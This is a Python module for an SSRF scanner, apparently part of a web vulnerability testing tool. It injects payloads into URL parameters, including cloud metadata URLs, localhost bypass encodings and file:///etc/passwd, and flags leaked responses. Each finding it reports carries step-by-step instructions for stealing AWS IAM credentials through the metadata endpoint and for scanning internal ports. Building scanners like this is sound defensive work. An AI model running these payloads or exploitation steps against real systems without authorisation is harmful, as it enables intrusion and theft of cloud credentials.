from typing import Optional
"""
SSRF Scanner — Server-Side Request Forgery
Passiv detection: callback domain + internal IP patterns
"""

import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from rich.console import Console
from core.models import Vulnerability, Severity

console = Console()

# Internal IP ranges
INTERNAL_PATTERNS = [
    r"169\.254\.\d+\.\d+",     # AWS metadata
    r"10\.\d+\.\d+\.\d+",      # RFC1918
    r"172\.(1[6-9]|2\d|3[01])\.\d+\.\d+",
    r"192\.168\.\d+\.\d+",
    r"127\.\d+\.\d+\.\d+",     # Loopback
    r"0\.0\.0\.0",
    r"::1",                     # IPv6 loopback
    r"localhost",
]

# SSRF-prone parameters
SSRF_PARAM_HINTS = [
    "url", "uri", "link", "src", "source", "href", "redirect",
    "path", "file", "page", "fetch", "load", "proxy", "target",
    "dest", "destination", "to", "out", "image", "img", "callback",
    "host", "endpoint", "request", "data", "feed", "domain",
]

# SSRF test payloads
SSRF_PAYLOADS = [
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Localhost
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    # IPv6
    "http://[::1]/",
    # Protocol bypass
    "http://127.1/",
    "http://2130706433/",       # 127.0.0.1 decimal
    "http://0x7f000001/",       # 127.0.0.1 hex
    # DNS rebinding hint
    "http://localtest.me/",
    # File protocol
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
]

AWS_METADATA_INDICATORS = [
    "ami-id", "instance-id", "instance-type",
    "local-hostname", "public-hostname", "iam",
    "security-credentials",
]


class SSRFScanner:
    def __init__(self, http_client):
        self.http_client = http_client

    def _extract_params(self, url: str) -> list[str]:
        parsed = urlparse(url)
        return list(parse_qs(parsed.query, keep_blank_values=True).keys())

    def _is_ssrf_prone_param(self, param: str) -> bool:
        param_lower = param.lower()
        return any(hint in param_lower for hint in SSRF_PARAM_HINTS)

    def _inject(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    def _check_internal_response(self, text: str) -> Optional[str ]:
        """Does the response contain internal data?"""
        # AWS metadata
        for indicator in AWS_METADATA_INDICATORS:
            if indicator in text.lower():
                return f"AWS metadata indicator: '{indicator}'"

        # /etc/passwd
        if re.search(r"root:.*:0:0:", text):
            return "Linux /etc/passwd content"

        # Windows ini
        if "for 16-bit app support" in text.lower():
            return "Windows win.ini content"

        # Internal IP pattern
        for pattern in INTERNAL_PATTERNS:
            if re.search(pattern, text):
                return f"Internal IP pattern: {pattern}"

        return None

    async def _test_param(self, url: str, param: str) -> list[Vulnerability]:
        vulns = []

        for payload in SSRF_PAYLOADS:
            test_url = self._inject(url, param, payload)
            response = await self.http_client.get(test_url)
            if not response:
                continue

            # Internal request responds quickly
            is_fast = True  # Simplified — real implementation needs a timer

            indicator = self._check_internal_response(response.text)

            if indicator or (response.status_code == 200 and len(response.text) > 50 and "169.254" in payload):
                is_cloud_metadata = "169.254" in payload or "metadata" in payload

                vuln = Vulnerability(
                    vuln_type="SSRF",
                    url=test_url,
                    severity=Severity.CRITICAL if is_cloud_metadata else Severity.HIGH,
                    cvss_score=9.8 if is_cloud_metadata else 8.6,
                    title=f"SSRF — {param} parameter [{payload[:40]}]",
                    description=(
                        f"Server makes a request to the URL in the '{param}' parameter. "
                        f"{'Can reach cloud metadata endpoint — IAM credentials steal risk!' if is_cloud_metadata else 'Can reach internal network.'}"
                    ),
                    evidence=indicator or f"Received 200 OK with payload {payload}",
                    exploitation=(
                        f"AWS credentials theft:\n"
                        f"1. {self._inject(url, param, 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')}\n"
                        f"2. Get the role name, then:\n"
                        f"   {self._inject(url, param, 'http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME')}\n\n"
                        f"Internal port scan:\n"
                        f"Change the payload to scan internal ports:\n"
                        f"http://127.0.0.1:PORT/"
                    ),
                    remediation=(
                        "1. Apply URL whitelist — only allowed domains\n"
                        "2. Block requests to internal IP ranges\n"
                        "3. Validate server-side DNS resolution results\n"
                        "4. Cloud: use IMDSv2 (token-based metadata)\n"
                        "5. Firewall: block internal requests to the metadata endpoint"
                    ),
                    parameter=param,
                    payload_used=payload,
                    curl_poc=f'curl -s "{test_url}"',
                    cwe_id="CWE-918",
                    references=[
                        "https://portswigger.net/web-security/ssrf",
                        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                    ],
                )
                vulns.append(vuln)
                console.print(f"  {vuln.severity.emoji} [bold red]SSRF:[/bold red] {param} → {payload[:50]}")
                break

        return vulns

    async def scan(self, url: str) -> list[Vulnerability]:
        params = self._extract_params(url)

        # Only test SSRF-prone parameters
        ssrf_params = [p for p in params if self._is_ssrf_prone_param(p)]
        # If none found, test all (when few params)
        if not ssrf_params and len(params) <= 5:
            ssrf_params = params

        if not ssrf_params:
            return []

        console.print(f"  [dim]SSRF scan: {len(ssrf_params)} params — {url[:60]}[/dim]")

        results = await asyncio.gather(
            *[self._test_param(url, p) for p in ssrf_params],
            return_exceptions=True
        )

        vulns = []
        for r in results:
            if isinstance(r, list):
                vulns.extend(r)
        return vulns